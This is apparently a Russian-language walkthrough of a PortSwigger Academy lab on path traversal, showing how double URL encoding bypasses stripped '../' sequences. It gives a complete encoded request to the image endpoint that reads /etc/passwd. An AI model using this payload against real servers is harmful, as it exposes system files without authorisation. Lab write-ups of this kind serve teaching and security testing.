При загрузке веб-ресурса заметим, что идут отдельные GET запросы к веб-серверу и отправим данный запрос в repeater
```
GET /image?filename=73.jpg
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/3.%20Directory%20traversal/4.%20Lab%20File%20path%20traversal%2C%20traversal%20sequences%20stripped%20with%20superfluous%20URL-decode/pics%20fow%20walktrough/1.png)

При определенных настройках, веб сервер может удалять любые последовательности обхода каталога перед передачей вашего ввода в приложение. Иногда вы можете обойти этот вид очистки с помощью кодирования URL-адреса или даже двойного кодирования URL-адреса, символов

Для этого откроем вкладку Decoder и выберем `Encode as` -> `URL`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/3.%20Directory%20traversal/4.%20Lab%20File%20path%20traversal%2C%20traversal%20sequences%20stripped%20with%20superfluous%20URL-decode/pics%20fow%20walktrough/2.png)
  
тем самым `../` превращается в `%2e%2e%2f`, и оно при повторном кодировании в URL превращается в `%25%32%65%25%32%65%25%32%66`

Повторим аналогичные действия для `/` -> `%2f` -> `%25%32%66`

Тем самым, наше уже известное
```
../../etc/passwd 
```
првевращается в
```
GET /image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc%25%32%66passwd
```
Его и запишем в запрос к потенциально уязвимому ресурсу, и получим доступ к /etc/passwd
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/3.%20Directory%20traversal/4.%20Lab%20File%20path%20traversal%2C%20traversal%20sequences%20stripped%20with%20superfluous%20URL-decode/pics%20fow%20walktrough/3.png)
